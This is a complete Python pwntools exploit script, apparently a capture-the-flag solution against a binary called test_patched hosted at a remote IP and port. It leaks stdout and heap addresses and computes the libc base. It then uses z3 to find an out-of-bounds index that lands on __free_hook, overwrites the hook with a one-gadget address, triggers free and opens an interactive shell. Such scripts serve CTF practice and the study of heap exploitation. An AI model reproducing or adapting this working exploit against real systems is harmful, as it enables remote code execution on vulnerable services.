#!/usr/bin/env python3

from pwn import *
from z3 import *

exe = ELF("test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
            b * update_value + 94
            c
                       """)
    else:
        r = remote("94.250.201.212", 10003)

    return r


def calc(__free_hook_addr, heap_addr):
    i = BitVec('i', 64)

    free_address = BitVecVal(__free_hook_addr, 64)
    base_address = BitVecVal(heap_addr, 64)

    computed_free = i * 88 + base_address + 0x50

    solver = Solver()
    solver.add(computed_free == free_address)

    if solver.check() == sat:
        model = solver.model()
        value_i = model[i].as_long()
        print(f"i = {value_i}")
        return value_i
    else:
        print("No solution found.")
        return False

def main():
    r = conn()
    r.recvuntil("Choice:")
    r.sendline("5")
    output = r.recvuntil("=")
    stdout_addr = int(output.split(b"stdout: ")[1].split(b"\n")[0], 16)
    heap_addr = int(output.split(b"] \n")[1].split(b"\n")[0], 16) - 88
    __free_hook_addr = stdout_addr + 4488
    libc_base = stdout_addr - 0x3c5620
    gadget_addr =  libc_base + 0x4527a #4199147 #__free_hook_addr # temp # Now it's returning to view logs alhamdullah
    log.info(f"{hex(stdout_addr)} {hex(heap_addr)} {hex(__free_hook_addr)}")
    index = calc(__free_hook_addr, heap_addr)
    if index:
        print(index)
    else:
        print("Not found")

    r.sendline("3")
    r.recvuntil("Record index:")
    r.sendline(str(index))
    r.recvuntil("New value:")
    print(str(gadget_addr))
    r.sendline(str(gadget_addr))
    r.recvuntil("Choice:")
    r.sendline("6")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()